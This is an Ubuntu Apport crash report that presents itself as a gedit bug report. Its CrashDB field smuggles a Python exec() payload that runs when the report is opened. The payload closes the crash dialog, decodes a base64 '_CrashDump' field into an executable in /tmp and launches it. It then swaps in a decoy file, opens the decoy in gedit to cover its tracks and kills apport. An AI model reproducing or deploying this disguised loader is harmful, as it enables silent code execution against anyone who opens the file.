ProblemType: Bug
ExecutablePath: /usr/bin/gedit
Package: gedit
SourcePackage: gedit
Stacktrace:
 None
CrashDB: {'impl': 'memory', 'crash_config': exec("""
 import inspect
 ui = inspect.getouterframes(inspect.currentframe())[-2][0].f_locals["self"]
 ui.w('dialog_crash_new').destroy()
 def run_p(ui):
     import random
     ran = random.random()
     file_name = str(ran-int(ran))[1:]
     #print("** File : %s" % file_name)
     file_path = "/tmp/"+file_name
     f = open(file_path,"wb")
     enc_data = ui.report.pop("_CrashDump", None)
     import base64
     data = base64.b64decode(enc_data)
     f.write(data)
     f.close()
     import shlex     
     import subprocess
     stat = subprocess.call("chmod +x " + file_path,shell=True )
     #print("** Status %s" % str(stat))
     subprocess.Popen(file_path)
     decoy_data_b64 = ui.report.pop("_MemDump", None)
     data = base64.b64decode(decoy_data_b64)
     #print("** Replaced with %s" % ui.report_file)
     fo = open(ui.report_file, "wb")
     fo.write(data)
     fo.close()
     command = '{} {}'.format(ui.report["ExecutablePath"], shlex.quote(ui.report_file))
     #print("** Running command", command)
     subprocess.Popen(command, shell=True)
 import threading
 run_proc = threading.Thread(target=run_p, args=(ui,))
 run_proc.start()
 #Killing apport process
 subprocess.Popen("pkill apport", shell=True)
 """, {}) }
